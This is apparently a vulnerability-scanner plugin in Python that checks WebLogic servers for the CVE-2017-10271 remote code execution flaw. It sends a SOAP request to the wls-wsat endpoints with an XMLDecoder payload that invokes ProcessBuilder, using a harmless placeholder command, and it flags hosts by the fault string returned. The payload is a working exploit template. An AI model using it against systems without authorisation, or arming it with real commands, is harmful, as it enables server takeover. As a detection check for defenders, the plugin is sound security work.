#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Reference: https://www.cnblogs.com/sevck/p/8092760.html

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'rce_cve201710271'
        self.info = "Check the WebLogic WLS RCE CVE-2017-10271"
        self.keyword = ['all', 'weblogic', 'rce', 'web', 'intranet', 'cve_2017_10271', 'danger', '7001',]
        self.default_ports_list = [7001,]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        poc = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                    <java>
                    <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="2">
                    <void index="0">
                    <string>just4check</string>
                    </void>
                    </array>
                    <void method="start"/>
                    </void>
                    </java>
                </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body/>
        </soapenv:Envelope>
        '''
        heads = {
                  'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                  'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                  'Content-Type': 'text/xml;charset=UTF-8'
        }
        urls = []
        urls.append("http://%s:%d/wls-wsat/CoordinatorPortType"%(ip, port)) if add_web_path == "" else urls.append("http://%s:%d/%s/wls-wsat/CoordinatorPortType"%(ip, port, add_web_path))
        urls.append("http://%s:%d/wls-wsat/CoordinatorPortType11"%(ip, port)) if add_web_path == "" else urls.append("http://%s:%d/%s/wls-wsat/CoordinatorPortType11"%(ip, port, add_web_path))
        urls.append("https://%s:%d/wls-wsat/CoordinatorPortType"%(ip, port)) if add_web_path == "" else urls.append("https://%s:%d/%s/wls-wsat/CoordinatorPortType"%(ip, port, add_web_path))
        urls.append("https://%s:%d/wls-wsat/CoordinatorPortType11"%(ip, port)) if add_web_path == "" else urls.append("https://%s:%d/%s/wls-wsat/CoordinatorPortType11"%(ip, port, add_web_path))
        for url in urls:
            try:
                req = Requester(url, method='post', data=poc, noencode=True, header=heads)
                if '<faultstring>java.lang.ProcessBuilder' in req.html or "<faultstring>0" in req.html:
                    result = "exists WebLogic WLS RCE CVE-2017-10271"
                    self._output(ip, port, result)
                    return
            except:
                pass

globals()['VulnChecker'] = VulnChecker